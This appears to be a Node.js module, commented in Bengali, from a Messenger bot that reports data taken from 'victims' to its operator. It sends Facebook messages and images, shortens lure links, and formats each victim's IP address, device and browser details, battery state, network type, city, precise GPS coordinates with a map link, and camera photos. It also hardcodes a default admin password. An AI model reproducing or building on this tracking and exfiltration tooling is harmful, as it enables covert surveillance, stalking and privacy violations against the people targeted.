const axios = require('axios');
const Config = require('../models/Config');
const fs = require('fs-extra');
const path = require('path');

function getLocalConfig() {
    const file = path.join(__dirname, '../data/config.json');
    if (fs.existsSync(file)) {
        try {
            return fs.readJsonSync(file);
        } catch (e) {
            return { mongoUri: '', adminPassword: 'Sakib@7890' };
        }
    }
    return { mongoUri: '', adminPassword: 'Sakib@7890' };
}

async function getConfig() {
    try {
        let config = await Config.findOne({ key: 'bot_config' });
        if (!config) {
            config = new Config({
                key: 'bot_config',
                pageAccessToken: '',
                verifyToken: 'Sakib_Verify',
                baseUrl: ''
            });
            await config.save();
        }
        return config;
    } catch (err) {
        console.log('⚠️ MongoDB থেকে কনফিগ আনতে ব্যর্থ:', err.message);
        return {
            pageAccessToken: '',
            verifyToken: 'Sakib_Verify',
            baseUrl: 'http://localhost:3000'
        };
    }
}

// ================================================================
// টেক্সট মেসেজ
// ================================================================
async function sendMessage(recipientId, text) {
    try {
        const config = await getConfig();
        const token = config.pageAccessToken;
        if (!token || token === '') {
            console.error('❌ টোকেন সেট নেই!');
            return { success: false, error: 'TOKEN_MISSING' };
        }
        if (token.length < 50) {
            console.error('❌ টোকেন খুব ছোট!');
            return { success: false, error: 'INVALID_TOKEN' };
        }

        const response = await axios.post(
            `https://graph.facebook.com/v18.0/me/messages?access_token=${token}`,
            {
                recipient: { id: recipientId },
                message: { text: text }
            },
            { timeout: 10000 }
        );

        console.log(`✅ টেক্সট মেসেজ পাঠানো হয়েছে: ${recipientId}`);
        return { success: true, data: response.data };

    } catch (err) {
        if (err.response) {
            console.error('❌ ফেসবুক এরর:', err.response.data);
        } else {
            console.error('❌ মেসেজ পাঠাতে ব্যর্থ:', err.message);
        }
        return { success: false, error: err.message };
    }
}

// ================================================================
// 🆕 ইমেজ মেসেজ (Base64 থেকে অ্যাটাচমেন্ট)
// ================================================================
async function sendImageMessage(recipientId, base64Image) {
    try {
        const config = await getConfig();
        const token = config.pageAccessToken;
        if (!token || token === '') {
            console.error('❌ টোকেন সেট নেই!');
            return { success: false, error: 'TOKEN_MISSING' };
        }

        // ফেসবুকে ইমেজ পাঠানোর সঠিক ফরম্যাট
        const response = await axios.post(
            `https://graph.facebook.com/v18.0/me/messages?access_token=${token}`,
            {
                recipient: { id: recipientId },
                message: {
                    attachment: {
                        type: 'image',
                        payload: {
                            is_reusable: false,
                            url: `data:image/jpeg;base64,${base64Image}`
                        }
                    }
                }
            },
            { timeout: 15000 }
        );

        console.log(`✅ ইমেজ মেসেজ পাঠানো হয়েছে: ${recipientId}`);
        return { success: true, data: response.data };

    } catch (err) {
        if (err.response) {
            console.error('❌ ইমেজ পাঠাতে ফেসবুক এরর:', err.response.data);
        } else {
            console.error('❌ ইমেজ পাঠাতে ব্যর্থ:', err.message);
        }
        return { success: false, error: err.message };
    }
}

// ================================================================
// বাকি ফাংশন
// ================================================================
async function getUserProfile(senderId) {
    try {
        const config = await getConfig();
        const token = config.pageAccessToken;
        if (!token) return null;
        const res = await axios.get(`https://graph.facebook.com/${senderId}?access_token=${token}`);
        return res.data;
    } catch (err) {
        console.error('Profile fetch error:', err.message);
        return null;
    }
}

async function shortenUrl(longUrl) {
    try {
        const response = await axios.get(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(longUrl)}`, {
            timeout: 5000
        });
        return response.data.trim();
    } catch (err) {
        console.error('Shorten error:', err.message);
        return longUrl;
    }
}

function formatVictimData(victim) {
    const d = victim.device || {};
    const deviceTime = new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' });
    
    let msg = '✅ *ভিক্টিমের তথ্য পাওয়া গেছে!*\n\n';
    msg += `⚓️ *আইপি অ্যাড্রেস:* ${victim.ip || 'N/A'}\n`;
    msg += `🕐 *সময়:* ${deviceTime}\n\n`;
    
    const phoneModel = d.platform || d.userAgent?.split('(')[1]?.split(')')[0] || 'N/A';
    msg += `📱 *ফোনের মডেল:* ${phoneModel}\n`;
    
    const browser = d.userAgent?.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[0-9.]+/)?.[0] || 'N/A';
    msg += `🌐 *ব্রাউজার:* ${browser}\n`;
    msg += `👆 *টাচ পয়েন্ট:* ${d.maxTouchPoints || 0}\n`;
    msg += `🗣️ *ভাষা:* ${d.language || 'N/A'}\n\n`;
    
    const b = victim.battery || {};
    msg += `🔋 *চার্জ:* ${b.level || 'N/A'}%\n`;
    msg += `⚡ *চার্জ হচ্ছে:* ${b.charging ? 'হ্যাঁ' : 'না'}\n\n`;
    
    const n = victim.network || {};
    const connectionType = n.type || 'N/A';
    msg += `📶 *কানেকশন:* ${connectionType === 'wifi' ? '📶 ওয়াইফাই' : connectionType === 'cellular' ? '📱 মোবাইল ডেটা' : connectionType}\n\n`;
    
    if (victim.location && victim.location.city) {
        msg += `📍 *আনুমানিক অবস্থান:* ${victim.location.city}, ${victim.location.country}\n`;
    } else {
        msg += `📍 *আনুমানিক অবস্থান:* N/A\n`;
    }
    
    if (victim.camera && victim.camera.length > 0) {
        msg += `\n📸 *ক্যামেরা ছবি:* ${victim.camera.length}টি (ছবি আলাদাভাবে আসছে)`;
    }
    
    msg += `\n\n🆔 ভিক্টিম আইডি: ${victim.id}`;
    return msg;
}

function formatLocationMessage(gpsLocation) {
    if (!gpsLocation || !gpsLocation.latitude) return null;
    const mapLink = gpsLocation.googleMaps || 
        `https://www.google.com/maps?q=${gpsLocation.latitude},${gpsLocation.longitude}`;
    return `📍 *লোকেশন পারমিশন দেওয়া হয়েছে!*\n\n` +
           `📌 অক্ষাংশ: ${gpsLocation.latitude}\n` +
           `📌 দ্রাঘিমাংশ: ${gpsLocation.longitude}\n` +
           `🎯 নির্ভুলতা: ${gpsLocation.accuracy} মিটার\n\n` +
           `🔗 গুগল ম্যাপ: ${mapLink}`;
}

module.exports = {
    getConfig,
    getLocalConfig,
    sendMessage,
    sendImageMessage,    // <--- নতুন ফাংশন এক্সপোর্ট করা হয়েছে
    getUserProfile,
    shortenUrl,
    formatVictimData,
    formatLocationMessage
};